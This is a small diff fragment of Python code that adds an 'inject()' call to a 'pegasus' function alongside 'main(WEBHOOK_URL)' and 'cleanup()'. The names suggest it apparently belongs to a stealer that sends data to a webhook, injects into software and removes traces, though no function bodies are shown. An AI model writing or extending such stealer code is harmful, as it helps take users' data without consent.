@@ -66,6 +66,7 @@ def main(webhook_url):
 def pegasus():
     for func in {
         main(WEBHOOK_URL), 
+        inject(),
         cleanup(),
     }:
         try:
